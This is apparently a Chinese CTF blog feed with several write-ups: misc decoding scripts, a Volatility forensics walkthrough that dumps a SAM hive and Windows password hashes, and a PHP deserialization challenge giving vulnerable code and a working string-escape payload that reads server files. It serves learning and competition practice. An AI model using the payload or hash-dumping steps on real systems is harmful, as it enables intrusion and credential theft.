class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#  -*-coding:utf8 -*-</span></span><br><span class="line"><span class="keyword">import</span>  os</span><br><span class="line"><span class="keyword">import</span>  zxing</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">reader=zxing.BarCodeReader()</span><br><span class="line">asc=<span class="string">&#x27;&#x27;</span></span><br><span class="line">path=<span class="string">&quot;C:\\Users\\Administrator\\Desktop\\聊城\\qrcode&quot;</span></span><br><span class="line">files=os.listdir(path)</span><br><span class="line"><span class="keyword">for</span> i  <span class="keyword">in</span>  <span class="built_in">range</span> (<span class="number">0</span>,<span class="built_in">len</span>(files)-<span class="number">1</span>):</span><br><span class="line">    <span class="comment"># try:</span></span><br><span class="line">    <span class="comment">#         content=reader.decode(file).raw</span></span><br><span class="line">    <span class="comment">#         if content==&quot;zero&quot;:</span></span><br><span class="line">    <span class="comment">#             asc+=str(0) #这是识别二维码的方法</span></span><br><span class="line">    <span class="comment">#         if content==&quot;one&quot;:</span></span><br><span class="line">    <span class="comment">#             asc+=str(1)</span></span><br><span class="line">    <span class="comment"># except:</span></span><br><span class="line">    <span class="comment">#     pass</span></span><br><span class="line">    size=os.path.getsize(<span class="built_in">str</span>(i)+<span class="string">&quot;.png&quot;</span>)</span><br><span class="line">   <span class="comment">#这是使用filesize做的方法</span></span><br><span class="line">    <span class="keyword">if</span> size==<span class="number">3409</span>:</span><br><span class="line">        asc+=<span class="string">&#x27;0&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        asc+=<span class="string">&#x27;1&#x27;</span></span><br><span class="line">asc=<span class="built_in">int</span>(asc,base=<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(asc)</span><br><span class="line">asc=<span class="built_in">hex</span>(asc)</span><br><span class="line">asc=asc[<span class="number">2</span>:]</span><br><span class="line"><span class="built_in">print</span>(binascii.a2b_hex(asc).decode())</span><br></pre></td></tr></table></figure><p>flag{duyoulikeit}</p><h2 id="relax"><a href="#relax" class="headerlink" title="relax"></a>relax</h2><p>打开是个.flag结尾的文件，丢进010editor看见是PK开头，考虑zip，解压出来一个flag.txt 一个音频。</p><p>flagtxt里面的base64解出来啥也不是，于是继续看音频。</p><p>考虑音频隐写，在文件详细信息里面发现了一串base64,解码后打开mp3stego，输入这个密码，得到了一串fakeflag：</p><p>fakeflag{same_length_with_true_flaghh}</p><p>和真的长的一样呢，真真假假</p><p>后面就没思路了。</p><p>后来看师傅的wp说需要讲该字符串与之前解出来啥也不是的base64异或就可以得到flag。草。</p><p>上脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>  base64</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>) <span class="keyword">as</span>  f:</span><br><span class="line">    str1=f.readline()</span><br><span class="line">str1=base64.b64decode(str1)</span><br><span class="line">fakeflag=<span class="string">&quot;fakeflag&#123;same_length_with_true_flaghh&#125;&quot;</span>.encode()</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="built_in">len</span>(fakeflag)):</span><br><span class="line">    tmp=fakeflag[i]^str1[i]</span><br><span class="line">    flag+=<span class="built_in">chr</span>(tmp)</span><br><span class="line"><span class="built_in">print</span>( flag)</span><br></pre></td></tr></table></figure><p>这里需要注意的是：encode()方法是str类型提供的，将其转换为byte类型。decode（）方法是将byte类型转化为str类型。之前我都是出错了就直接瞎encode，decode，咋对咋弄。。今天终于知道了。</p><p>flag：flag{9ff3a239027a7089237686b384862d33}</p><h2 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h2><p>base64套娃，光想着basecrack，结果直接卡死。。就是没想起来自己写脚本。</p><p>附上hxd的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span> (<span class="string">&quot;base.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span>  f:</span><br><span class="line">    content=f.read()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        content=base64.b16decode(content).decode()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;b16&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(content)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            content=base64.b32decode(content).decode()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;b32&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(content)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                content=base64.b64decode(content).decode()</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;b64&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(content)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    content=base64.b85decode(content).decode()</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;b85&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(content)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>flag:flag{4b057431c3ee0c4f56d4dad18c352375}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;打聊城的比赛，又白给了，拿了参与奖，做出来两个misc，剩下两个misc都做了快一半，没思路了，特来复现。&lt;/p&gt;
&lt;h1 id=&quot;web&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>取证专题</title>
    <link href="https://polosec.github.io/2020/11/17/%E5%8F%96%E8%AF%81%E4%B8%93%E9%A2%98/"/>
    <id>https://polosec.github.io/2020/11/17/%E5%8F%96%E8%AF%81%E4%B8%93%E9%A2%98/</id>
    <published>2020-11-17T03:49:09.000Z</published>
    <updated>2020-11-17T04:32:36.606Z</updated>
    
    <content type="html"><![CDATA[<p>取证需要用到的工具：</p><p>volatility、注册表分析工具（WRR）、AXIOM等。</p><h1 id="例题分析"><a href="#例题分析" class="headerlink" title="例题分析"></a>例题分析</h1><h2 id="湖湘杯misc"><a href="#湖湘杯misc" class="headerlink" title="湖湘杯misc"></a>湖湘杯misc</h2><p>首先看一下imageinfo</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 用户名注册表.vmem  imageinfo</span><br></pre></td></tr></table></figure><p>选择一个supported  profile，这里选第一个不行，所以选第二个Win2003SP2x86</p><p>先扫一下pslist</p><p>volatility -f 用户名注册表.vmem  –profile=Win2003SP2x86 pslist</p><p>除了winlogon.exe之外没啥收获，然后扫一下网络，也没啥收获。</p><p>后面尝试扫描connscan，cmdscan，notepad。</p><p>在扫notepad的时候发现了一些东西，于是尝试扫一下后缀为.txt的文件，看看有没有收获。</p><img src="http://cdn.polowong.top/static/images/hxbmisc1.jpg"><p>发现了一个file.txt，尝试dump到本地。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 用户名注册表.vmem  --profile&#x3D;Win2003SP2x86 dumpfiles -Q 0x000000000412cde0 -D .&#x2F;</span><br></pre></td></tr></table></figure><p>dump下来的文件内容为</p><p>什么？计算机又被不知名账户登录了？明明在计算机管理中没有这个用户，为什么还会被这个用户登录呢？电脑跟前的你能帮我找到原因吗？flag为该用户的用户名以及密码的md5值。</p><p>格式：md5(用户名:密码）</p><p>下面考虑在注册表中找一下隐藏用户。</p><p>首先看一下注册表。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 用户名注册表.vmem  --profile&#x3D;Win2003SP2x86 hivelist volatility -f 用户名注册表.vmem  --profile&#x3D;Win2003SP2x86 hivelist</span><br></pre></td></tr></table></figure><p>发现了SAM表。SAM表是存储了电脑登录用户相关信息的表，尝试dump出SAM表。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 用户名注册表.vmem  --profile&#x3D;Win2003SP2x86 dumpregistry -D .&#x2F;</span><br></pre></td></tr></table></figure><p>然后使用注册表分析工具打开。</p><img src="http://cdn.polowong.top/static/images/hxbmisc2.jpg"><p>可以看到很多隐藏账户，一个个看看是否有last logon 这个属性。</p><p>最后找到了用户 FHREhpe，然后再回到volatility里面hashdump 出来关于他的账号密码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 用户名注册表.vmem  --profile&#x3D;Win2003SP2x86 hashdump | grep FHREhpe</span><br><span class="line">有如下数据：</span><br><span class="line">FHREhpe$:1171:70fdb8f853bd427d7584248b8d2c9f9e:f3cf477fc3ea6ec0b3b5887616dd4506:::</span><br></pre></td></tr></table></figure><p>  <em>Windows</em>系统下的<em>hash</em>密码格式为：用户名称*:RID:LM-HASH<em>值</em>:NT-HASH*值 </p><p>获得NT HASH值后可以去md5网站解密，解密后的密码是NIAIWOMA</p><p>然后将其MD5加密后即可获得flag。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://bbs.ichunqiu.com/thread-59102-1-1.html">https://bbs.ichunqiu.com/thread-59102-1-1.html</a></p><p><a href="https://www.sqlsec.com/2019/11/winhash.html">https://www.sqlsec.com/2019/11/winhash.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;取证需要用到的工具：&lt;/p&gt;
&lt;p&gt;volatility、注册表分析工具（WRR）、AXIOM等。&lt;/p&gt;
&lt;h1 id=&quot;例题分析&quot;&gt;&lt;a href=&quot;#例题分析&quot; class=&quot;headerlink&quot; title=&quot;例题分析&quot;&gt;&lt;/a&gt;例题分析&lt;/h1&gt;&lt;h2 id=&quot;</summary>
      
    
    
    
    
    <category term="取证" scheme="https://polosec.github.io/tags/%E5%8F%96%E8%AF%81/"/>
    
  </entry>
  
  <entry>
    <title>1104学习笔记</title>
    <link href="https://polosec.github.io/2020/11/09/1104%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://polosec.github.io/2020/11/09/1104%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2020-11-09T08:52:34.000Z</published>
    <updated>2020-11-09T08:54:26.221Z</updated>
    
    <content type="html"><![CDATA[<h1 id="python文件反编译"><a href="#python文件反编译" class="headerlink" title="python文件反编译"></a>python文件反编译</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="linespan><br></pre></td></tr></table></figure><p>使用010editor编辑，paste from hex，然后另存为1.pyc。<br>python安装uncompyle  , pip install uncompyle<br>下面就是 uncompyle 1.pyc&gt;1.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span>():</span></span><br><span class="line">    <span class="built_in">str</span> = [</span><br><span class="line">     <span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">123</span>, <span class="number">51</span>, <span class="number">56</span>, <span class="number">97</span>, <span class="number">53</span>, <span class="number">55</span>, <span class="number">48</span>, <span class="number">51</span>, <span class="number">50</span>, <span class="number">48</span>, <span class="number">56</span>, <span class="number">53</span>, <span class="number">52</span>, <span class="number">52</span>, <span class="number">49</span>, <span class="number">101</span>, <span class="number">55</span>, <span class="number">125</span>]</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(i)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> flag</span><br><span class="line">flag()</span><br></pre></td></tr></table></figure><p>运行即可获得flag</p><h1 id="base64隐写"><a href="#base64隐写" class="headerlink" title="base64隐写"></a>base64隐写</h1><p>解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_base64_diff_value</span>(<span class="params">s1, s2</span>):</span></span><br><span class="line">    base64chars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">len</span>(s2)):</span><br><span class="line">        <span class="keyword">if</span> s1[i] != s2[i]:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">abs</span>(base64chars.index(s1[i]) - base64chars.index(s2[i]))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve_stego</span>():</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        file_lines = f.readlines()</span><br><span class="line">        bin_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> file_lines:</span><br><span class="line">            steg_line = line.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            norm_line = line.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).decode(<span class="string">&#x27;base64&#x27;</span>).encode(<span class="string">&#x27;base64&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            diff = get_base64_diff_value(steg_line, norm_line)</span><br><span class="line">            <span class="built_in">print</span> diff</span><br><span class="line">            pads_num = steg_line.count(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> diff:</span><br><span class="line">                bin_str += <span class="built_in">bin</span>(diff)[<span class="number">2</span>:].zfill(pads_num * <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                bin_str += <span class="string">&#x27;0&#x27;</span> * pads_num * <span class="number">2</span></span><br><span class="line">            <span class="built_in">print</span> goflag(bin_str)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">goflag</span>(<span class="params">bin_str</span>):</span></span><br><span class="line">    res_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="built_in">len</span>(bin_str), <span class="number">8</span>):</span><br><span class="line">        res_str += <span class="built_in">chr</span>(<span class="built_in">int</span>(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> res_str</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solve_stego()</span><br></pre></td></tr></table></figure><p>直接输入base64隐写后的内容即可</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;python文件反编译&quot;&gt;&lt;a href=&quot;#python文件反编译&quot; class=&quot;headerlink&quot; title=&quot;python文件反编译&quot;&gt;&lt;/a&gt;python文件反编译&lt;/h1&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;tab</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>反序列化专题</title>
    <link href="https://polosec.github.io/2020/11/03/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%93%E9%A2%98/"/>
    <id>https://polosec.github.io/2020/11/03/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%93%E9%A2%98/</id>
    <published>2020-11-03T11:54:08.000Z</published>
    <updated>2020-11-09T08:51:56.266Z</updated>
    
    <content type="html"><![CDATA[<h1 id="最近对反序列化产生了一些兴趣，所以开此篇内容记录所遇到的反序列化的问题。"><a href="#最近对反序列化产生了一些兴趣，所以开此篇内容记录所遇到的反序列化的问题。" class="headerlink" title="最近对反序列化产生了一些兴趣，所以开此篇内容记录所遇到的反序列化的问题。"></a>最近对反序列化产生了一些兴趣，所以开此篇内容记录所遇到的反序列化的问题。</h1><h2 id="安洵杯-easy-serialize-php"><a href="#安洵杯-easy-serialize-php" class="headerlink" title="安洵杯  easy_serialize_php"></a>安洵杯  easy_serialize_php</h2><p>题目代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$function &#x3D; @$_GET[&#39;f&#39;];</span><br><span class="line"></span><br><span class="line">function filter($img)&#123;</span><br><span class="line">    $filter_arr &#x3D; array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);</span><br><span class="line">    $filter &#x3D; &#39;&#x2F;&#39;.implode(&#39;|&#39;,$filter_arr).&#39;&#x2F;i&#39;;</span><br><span class="line">    return preg_replace($filter,&#39;&#39;,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if($_SESSION)&#123;</span><br><span class="line">    unset($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[&quot;user&quot;] &#x3D; &#39;guest&#39;;</span><br><span class="line">$_SESSION[&#39;function&#39;] &#x3D; $function;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line">if(!$function)&#123;</span><br><span class="line">    echo &#39;&lt;a href&#x3D;&quot;index.php?f&#x3D;highlight_file&quot;&gt;source_code&lt;&#x2F;a&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!$_GET[&#39;img_path&#39;])&#123;</span><br><span class="line">    $_SESSION[&#39;img&#39;] &#x3D; base64_encode(&#39;guest_img.png&#39;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $_SESSION[&#39;img&#39;] &#x3D; sha1(base64_encode($_GET[&#39;img_path&#39;]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$serialize_info &#x3D; filter(serialize($_SESSION));</span><br><span class="line"></span><br><span class="line">if($function &#x3D;&#x3D; &#39;highlight_file&#39;)&#123;</span><br><span class="line">    highlight_file(&#39;index.php&#39;);</span><br><span class="line">&#125;else if($function &#x3D;&#x3D; &#39;phpinfo&#39;)&#123;</span><br><span class="line">    eval(&#39;phpinfo();&#39;); &#x2F;&#x2F;maybe you can find something in here!</span><br><span class="line">&#125;else if($function &#x3D;&#x3D; &#39;show_image&#39;)&#123;</span><br><span class="line">    $userinfo &#x3D; unserialize($serialize_info);</span><br><span class="line">    echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>大概的流程是从浏览器接受GET方式的function，根据提示在phpinfo里面有东西。</p><p>进入phpinfo后搜索得到 d0g3_f1ag.php这个文件，于是猜测需要通过反序列化构造执行至程序最后一行的file_get_contnets().</p><p>那么看file_get_contents()是对 经过滤后、序列化后的serialize_info的反序列化取其img属性的结果。</p><p>先不管正则过滤，我们的目的是构造一个输入，让img的value为base64加密后的d0g3_f1ag.php。</p><p>目标结果如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;guest&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;highlight_file&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>但是正常输入的话我们是无法绕过 img_path 的判定的。</p><p>所以这里根据过滤入手，根据正则表达式以及preg_repace我们可以知道，将一些关键字替换成了无，即去掉。</p><p>这里我们可以使用POST方法，对_SESSION[]数组传参，传入的key为黑名单的值，这样在序列化完之后会吃掉该key的部分value。</p><p>听不懂正常，一开始我也听不懂，我就不像其他博主一样给你用不同的颜色标出来哪里是吃掉的部分了。</p><p>首先要了解php序列化后的语法（这里不赘述）</p><p>我们先随便写写，先POST个_SESSION[flag]=s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;}</p><p>看看结果是什么（把代码拷贝到本地，然后本地运行，echo或者var_dump出来序列化后的结果）：</p><p> a:2:{s:4:””;s:39:”s:3:”img”;s:20:”Z3Vlc3RfaW1nLnBuZw==”;}”;s:3:”img”;s:20:”Z3Vlc3RfaW1nLnBuZw==”;} </p><p>但是这样是不能正常反序列化的，因为不符合反序列化的语法规则。根据语法规则知道，如果我们想让img作为key，base64加密后的东西作为value的话，需要让上一个对象是正常的，符合序列化后的字符串的语法。</p><p>从前往后看，第一个对象的key为**”;s:**，这样会导致后面的字符串无法正常地反序列化。</p><p>所以，接下来需要做的是先把第一个对象的key和value补全，让其能正常地反序列化。</p><p>补全第一个key的话，需要让第一个key为**”;s:39:”**，所以需要在POST里面传入_SESSION[flagflag]，这样能吞掉八个位置。正好能让本段话加粗的内容作为第一个key（这里建议自己写写试试，看看是否符合反序列化语法的规则。）</p><p>补全之后<strong>请大家自己var_dump或者输出，我这里不会给出补全后输出的序列化结果。</strong></p><p>补全后发现，第一个对象可以正常序列化了，但是问题就是第二个对象的key成了第一个对象的value。</p><p>所以这里需要给第一个对象补个key，给_SESISON[flagflag]继续传值就可以，具体传什么，为什么要这样传，我也不会说。总之我们的目的是传一个符合序列化格式的value，并且传入后也需要让前后都符合序列化格式。</p><p>随便写一个就好 比如 s:3:”aaa”;  </p><p>首先你把他写进去，然后根据序列化格式在前后添加相关符号。连同刚才写的s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;}一起就是_SESSION[flagflag]= s:3:”aaa”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;}</p><p>现在放进去看看是什么效果。是否能够正常反序列化</p><p>a:2:{s:8:””;s:46:”s:3:”aaa”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;}”;s:3:”img”;s:20:”Z3Vlc3RfaW1nLnBuZw==”;} </p><p>这样发现还是不能正常地反序列化，因为不符合语法。在s:3前缺少上一个字段的闭合”;    加上就好。</p><p>所以最终的payload就是</p><p>_SESSION[flagflag]=”;s:3:”aaa”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;}</p><p>打过去后查看源码，发现</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;flag in /d0g3_fllllllag&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>下面继续打对应的文件就好了~</p><p>_SESSION[flagflag]=”;s:3:”aaa”;s:3:”img”;s:20:”L2QwZzNfZmxsbGxsbGFn”;}</p><p>打进去即可获得一枚flag。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;最近对反序列化产生了一些兴趣，所以开此篇内容记录所遇到的反序列化的问题。&quot;&gt;&lt;a href=&quot;#最近对反序列化产生了一些兴趣，所以开此篇内容记录所遇到的反序列化的问题。&quot; class=&quot;headerlink&quot; title=&quot;最近对反序列化产生了一些兴趣，所以开此篇</summary>
      
    
    
    
    
    <category term="反序列化" scheme="https://polosec.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>安洵杯web</title>
    <link href="https://polosec.github.io/2020/10/31/%E5%AE%89%E6%B4%B5%E6%9D%AFweb/"/>
    <id>https://polosec.github.io/2020/10/31/%E5%AE%89%E6%B4%B5%E6%9D%AFweb/</id>
    <published>2020-10-30T16:11:37.000Z</published>
    <updated>2020-10-30T16:12:16.345Z</updated>
    
    <content type="html"><![CDATA[<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://www.cnblogs.com/Cl0ud/p/12585242.html">https://www.cnblogs.com/Cl0ud/p/12585242.html</a></p><h1 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h1><p>打开题目，观察URL为<a href="http://31d9d742-c1f3-428c-860d-b09b30c2b2d9.node3.buuoj.cn/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=">http://31d9d742-c1f3-428c-860d-b09b30c2b2d9.node3.buuoj.cn/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</a></p><p>于是猜测有个文件读取和命令执行，但是文件读取的格式是加密的，考虑base64解密，解密两次后再hex2ascii，可以得到文件名。</p><p>copy大佬的脚本，输入文件名即可得到根据此加密规律加密后的文件名：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">filename = <span class="built_in">input</span>().encode(encoding=<span 